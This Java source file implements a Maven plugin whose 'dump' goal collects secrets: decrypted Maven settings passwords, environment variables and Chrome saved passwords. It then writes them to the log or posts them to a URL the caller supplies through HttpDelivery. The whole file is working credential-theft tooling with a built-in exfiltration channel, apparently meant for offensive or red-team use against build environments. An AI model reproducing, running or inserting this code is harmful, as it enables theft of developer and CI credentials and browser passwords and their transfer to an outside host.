
package ninja.stealing.maven.password;

import ninja.stealing.maven.password.Logger.Logger;
import ninja.stealing.maven.password.Logger.MavenLogger;
import ninja.stealing.maven.password.Logger.NoLogger;
import ninja.stealing.maven.password.Logger.SystemLogger;
import ninja.stealing.maven.password.delivery.Delivery;
import ninja.stealing.maven.password.delivery.HttpDelivery;
import ninja.stealing.maven.password.delivery.LogDelivery;
import ninja.stealing.maven.password.extractor.ChromeExtractor;
import ninja.stealing.maven.password.extractor.EnvExtractor;
import ninja.stealing.maven.password.extractor.Extractor;
import ninja.stealing.maven.password.extractor.MavenPasswordExtractor;
import ninja.stealing.maven.password.model.Extraction;
import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugins.annotations.Mojo;
import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.settings.Settings;

import java.util.*;

@Mojo(requiresProject = false, name = "dump")
public class PasswordExtract extends AbstractMojo {
    @Parameter(defaultValue = "${session}", readonly = true, required = true)
    private MavenSession session;
    @Parameter(defaultValue = "${settings}", readonly = true, required = true)
    private Settings settings;
    @Parameter(defaultValue = "maven", property = "logger")
    protected String loggerType;
    @Parameter(defaultValue = "all", property = "extract")
    protected String extract;

    @Parameter(defaultValue = "log", property = "delivery")
    protected String delivery;

    @Parameter( property = "url")
    protected String url;
    private Map<String, Extractor> extractors ;

    public void execute() throws MojoExecutionException {
        List<Extraction> extractions = new ArrayList<Extraction>();
        List<Delivery> deliveries = new ArrayList<Delivery>();
        List<String> extractList = List.of(extract.split(","));
        List<String> deliveryList = List.of(delivery.split(","));
        Logger log;

        switch (loggerType) {
            case "nolog":
                log = new NoLogger();
                break;
            case "maven":
                log = new MavenLogger(getLog());
                break;
            case "system":
                log = new SystemLogger();
                break;
            default:
                log = new MavenLogger(getLog());
                log.warn("Incorrect value for properties logger. Using default.");
        }

        extractors = getExtractors(log, session, settings);
        for (Map.Entry<String, Extractor> entry : extractors.entrySet()) {
            if(extractList.contains("all") || extractList.contains(entry.getKey().toLowerCase(Locale.ROOT))) {
                Extraction extraction = entry.getValue().extract();
                extractions.add(extraction);
            }
        }
        Delivery delivery;
        if(deliveryList.contains("all") || deliveryList.contains("log")) {
            delivery = new LogDelivery(log);
            delivery.deliver(extractions);
        }

        if(deliveryList.contains("all") || deliveryList.contains("http")) {
            if(url!=null) {
                delivery = new HttpDelivery(log, url);
                delivery.deliver(extractions);
            }else{
                log.warn("Http logger need an url.");
            }
        }



    }

    private Map<String, Extractor> getExtractors(Logger log, MavenSession session, Settings settings) {
        Map<String,Extractor> result  = new HashMap<>();

        MavenPasswordExtractor mavenPasswordExtractor = new MavenPasswordExtractor(log, this.session, this.settings);
        result.put(MavenPasswordExtractor.EXTRACTOR_ID,mavenPasswordExtractor);

        EnvExtractor envExtractor = new EnvExtractor();
        result.put(EnvExtractor.EXTRACTOR_ID,envExtractor);

        ChromeExtractor chromeExtractor = new ChromeExtractor(log);
        result.put(ChromeExtractor.EXTRACTOR_ID,chromeExtractor);

        return result;
    }
}

